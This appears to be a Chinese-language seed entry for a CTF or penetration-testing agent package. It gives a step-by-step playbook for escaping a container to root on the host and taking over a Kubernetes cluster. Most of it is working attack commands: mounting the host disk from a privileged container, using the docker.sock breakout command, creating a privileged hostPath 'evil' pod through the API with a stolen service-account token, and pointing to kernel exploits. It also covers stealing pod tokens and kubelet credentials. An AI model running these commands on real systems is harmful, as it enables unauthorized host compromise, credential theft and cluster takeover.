# [种子] 容器逃逸 → 拿宿主机 root（cap_sys_admin / 特权容器 / docker.sock）

## 场景分类
渗透测试 / 云原生 / 容器安全

## 目标概述
拿到一个容器内的 shell（通过应用漏洞 / 暴露的 Jenkins / 或 K8s 上的 RCE），需要从容器逃逸到宿主机，进而横向控制整个 K8s 集群。

## 完整执行链路

1. 进容器后第一时间踩点
   ```bash
   id                                    # 是不是 root？
   cat /proc/self/status | grep CapEff   # 看 capabilities
   capsh --print                         # 同上更友好
   ls -la /var/run/docker.sock           # 是不是挂了 Docker socket？
   mount | grep -v proc                  # 看挂载哪些宿主机目录
   cat /proc/1/cgroup                    # 是 docker / containerd / kubepods？
   env | grep -i 'kube\|docker\|aws\|az' # 服务账号 / 元数据 token
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. 按检测结果选逃逸路径：

   **路径 A：特权容器（`--privileged`）**
   ```bash
   # 直接 mount 宿主机磁盘
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # 现在你是宿主机 root
   ```

   **路径 B：cap_sys_admin / cap_dac_read_search**
   ```bash
   # 利用 release_agent 绕过（CVE-2022-0492 类）
   # 利用 cap_sys_admin 直接 mount
   ```

   **路径 C：挂了 docker.sock**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **路径 D：K8s SA token 有过权限**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # 如果能 create pod → 用 hostPID/hostNetwork/hostPath 起特权 pod 逃逸
   ```

   **路径 E：kernel exploit（Dirty Pipe / Dirty COW / OverlayFS）**
   ```bash
   uname -a               # 看内核版本
   # 选择对应 CVE 的现成 exploit
   ```

3. 逃出来后，在宿主机上找下一跳
   - kubelet 凭据 (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - 其他 pod 的 token
   - hostNetwork → 直连集群所有 service IP
4. 横向扩散到整个 K8s

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| 容器是非 root，capabilities 都是空 | 应用层加固较好 | 找 setuid 二进制 / kernel 漏洞 / 容器外部漏洞 | 数小时 |
| 看到 docker.sock 但读不了 | sock 是 root:root 660 | 当前 uid 加入 docker 组（如果有 setgid 程序）or 利用其他容器 | 30min |
| 起了特权 pod 但镜像下载失败 | 内网集群，docker registry 内部 | 用集群里已有的镜像（kube-system 下随便挑） | 20min |
| K8s SA token 没权限 | 默认 SA 通常是 default/restricted | 试 list pods → 找有 cluster-admin 的 pod → 偷它的 SA token | 1h |
| chroot 后没有常用工具 | 宿主机是极简发行版 | mount /proc /dev /sys 后再用 chroot；或者直接在原 ns 操作 /host | 30min |
| 集群有 PodSecurity Standards | restricted 策略禁了 hostPath / privileged | 看是否有 namespace 的 admission 配置宽松；找带 deployment 创建权限的 SA | 数小时 |

## 工具链发现

- **deepce** 容器逃逸自动化检测（一个 sh 脚本，无依赖）
- **kdigger** Kubernetes/容器侦察工具，输出结构化结果
- **peirates** K8s 渗透专用 TUI
- **kube-hunter** Aqua 出品，扫集群安全问题
- **botb (break out the box)** 老牌容器逃逸工具
- **cdk** 容器渗透瑞士军刀（中文项目，覆盖中国云厂商场景）

## 关键代码/命令

一键自检：

```bash
# 拉 deepce（不依赖任何东西）
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# 输出：检测到 N 个逃逸路径
```

用 K8s SA token 起特权 pod 逃逸：

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# 检查权限
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# 如果能 create pod，用 hostPath 挂宿主机
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# 然后 exec 进 evil pod，chroot /host
```

CVE-2022-0492 利用（cap_sys_admin + 不带 user namespace）：

```bash
# 见 https://github.com/PaloAltoNetworks/cve-2022-0492
# 核心：mount cgroup → 写 release_agent → 触发空 cgroup → 在宿主机上下文执行
```

## 对本包的改进建议

- 已有 `CTF-Sandbox-Orchestrator/competition-agent-cloud/`，建议增加 `references/k8s-attack-paths.md`
- attack-chain 增加"容器逃逸 → 集群接管"完整路径示例
- bootstrap-manifest 加入 deepce / kdigger / peirates

## 可复用的模式/脚本片段

**容器逃逸 5 路径速查**：

```text
1. 特权容器           → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin     → CVE-2022-0492 (release_agent) / 自己挂 cgroup
3. docker.sock       → docker run -v /:/host alpine chroot /host
4. K8s SA + 权限     → 起 hostPath/privileged pod
5. kernel CVE        → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**逃出来后必看**：

```text
- /var/lib/kubelet/pods/        → 偷其他 pod 的 SA token
- /var/lib/docker/              → 看运行的容器列表
- ip addr                        → 用 hostNetwork 直接访问 service IP
- crictl ps                      → containerd 容器列表
- ps -ef --forest                → 找 kubelet / dockerd 启动参数（含 token）
```

## 进化动作
- [ ] CTF-Sandbox-Orchestrator/competition-agent-cloud 增加 k8s-attack-paths.md
- [ ] attack-chain 增加容器逃逸 → 集群接管路径
- [ ] bootstrap-manifest 增加 deepce/kdigger/peirates

## 环境信息
- 攻击位置: 容器内（任何 shell 入口都可）
- 目标: K8s 1.24+ / Docker 20+ / containerd 1.6+
- 内核: 视目标而定，关注 CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 时间窗

## 脱敏要求
本条目为种子数据，基于公开容器/K8s 安全研究编写，不涉及任何真实集群。
